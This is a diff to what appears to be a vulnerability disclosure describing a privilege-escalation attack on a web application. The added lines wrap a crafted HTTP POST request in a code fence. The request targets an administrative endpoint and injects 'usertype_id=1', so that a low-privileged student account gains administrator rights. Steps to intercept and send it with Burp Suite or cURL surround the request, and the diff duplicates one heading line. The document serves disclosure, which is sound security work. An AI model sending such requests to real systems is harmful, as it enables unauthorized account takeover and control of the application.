@@ -38,6 +38,9 @@ Step 1: Log in to the application as a standard, low-privileged user (e.g., Stud
 Step 2: Intercept the web traffic using a proxy tool like Burp Suite, or use cURL to send a crafted HTTP POST request to the administrative API endpoint. Inject usertype_id=1 into the body.
 
 Malicious HTTP Request:
+Malicious HTTP Request:
+
+```http
 POST /reviewer/system/system/admins/manage/users/btn_functions.php HTTP/1.1
 Host: [YOUR_TARGET_IP_OR_DOMAIN]
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0
@@ -54,6 +57,7 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
 usertype_id=1&firstname=[NEW_FIRSTNAME]&middlename=[NEW_MIDDLENAME]&lastname=[NEW_LASTNAME]&username=[NEW_USERNAME]&password=[NEW_PASSWORD]&btnUpdateUser=Save+changes
+```
 
 Step 3: Send the request. The server will process the update and redirect you.
 
